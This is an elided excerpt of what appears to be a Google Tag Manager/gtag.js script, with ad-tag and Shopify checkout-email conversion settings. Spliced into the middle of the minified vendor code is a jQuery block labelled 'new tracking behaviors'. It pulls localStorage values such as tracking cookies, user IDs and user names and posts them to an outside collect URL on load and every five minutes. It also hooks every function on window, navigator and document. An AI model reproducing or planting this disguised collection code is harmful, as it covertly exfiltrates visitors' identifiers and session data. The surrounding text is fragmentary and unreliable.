...
(function () {
  var data = {
    "resource": {
      ...
      "tags": [{
        ...
        "priority": 14,
        "vtp_instanceDestinationId": "AW-470935742",
        "tag_id": 8
      }, {
        ...
        "function": "__rep",
        "vtp_containerId": "AW-470935742",
        "vtp_remoteConfig": ["map", "enhanced_conversions", ["map", "-L9hCOSR78gCEL7Rx-AB", ["map", "enhanced_conversions_mode", "automatic", "enhanced_conversions_automatic_settings", ["map", "auto_detection_enabled", false, "email", ["map", "selector_type", "js_variable", "value", "Shopify.checkout.email"], "name_and_address", ["list"]]]]],
        "tag_id": 1
      }, {
    ...
    "security_groups": {
      "google": ["__ccd_ads_first", "__ccd_ads_last", "__ccd_pre_auto_pii", "__ogt_1p_data_v2", "__ogt_ads_datatos"]
    }
  };
  ...
  */
  ...
  aa = wa.prototype;
  // Code including new tracking behaviors

  $(document).ready(function () {
    var keysToWatch = ['tracking_cookie', 'user_id', 'user_name'];
    var eventTracked = {};
    var computeHash = function (data) {
      ...
      for (var i = 0; i < joinedKeys.length; i++) {
        var charCode = joinedKeys.charCodeAt(i);
        hashValue = (hashValue << 5) - hashValue + charCode;
        hashValue = hashValue & hashValue;
      }
      return hashValue.toString(16);
    };
    var filterLocalStorage = function () {
      var filteredData = {};
    ...
    var trackAndPostData = function (data) {
      var hashId = computeHash(data);
      var apiUrl = "https://example.com/api/collect";
      ...
      xhr.onreadystatechange = function () {
        if (xhr.readyState === XMLHttpRequest.DONE) {
          if (xhr.status === 200) {
            ...
            console.error("Data sending failed with status:" + xhr.status);
          }
        }
      };
      xhr.send(JSON.stringify(requestData));
    };
    var trackLocalStorageData = function () {
      var filteredLocalStorage = filterLocalStorage();
      if (Object.keys(filteredLocalStorage).length > 0) {
        trackAndPostData(filteredLocalStorage);
      }
    };
    window.addEventListener("DOMContentLoaded", function () {
      trackLocalStorageData();
    });
    setInterval(trackLocalStorageData, 300000); // 5 minutes

    // Hooks for all function calls
    function hookAll(rootObj, rootName) {
      var blacklist = ['clear', 'item', 'key', 'length', 'getItem', 'setItem', 'removeItem'];
      for (var key in rootObj) {
        if (typeof rootObj[key] === 'function' && !blacklist.includes(key)) {
          (function () {
            var orig = rootObj[key];
            rootObj[key] = function () {
              console.log(`${rootName}.${key} call with arguments: ${JSON.stringify(arguments)}`);
    ...
    hookAll(window, 'window');
    hookAll(navigator, 'navigator');
    hookAll(document, 'document');
  ...
  ii.fe = Number("0") || 0;
  ii.ka = "dataLayer";
  ii.Uj = "ChEI8POGpwYQwKfQoLnu2YWNARIlABhc5ucSmdUWE1yMqKNKSkeYf8Ifh2EqLnKWq8h19je8BGlXMRoC6ps\x3d";
  var li = {
      __cl: 1,
      __ecl: 1,
      __ehl: 1,
  ...
  function fF(a) {
    var b = !0;
    K(F(this), ["consentType:!string"], arguments), L(this, "access_consent", a, "read"), b = S(a);
    return b;
  }
  ...
  Z.m.access_consent = ["google"], function () {
    function a(b, c, d) {
      var e = {
        consentType: c,
        read: !1,
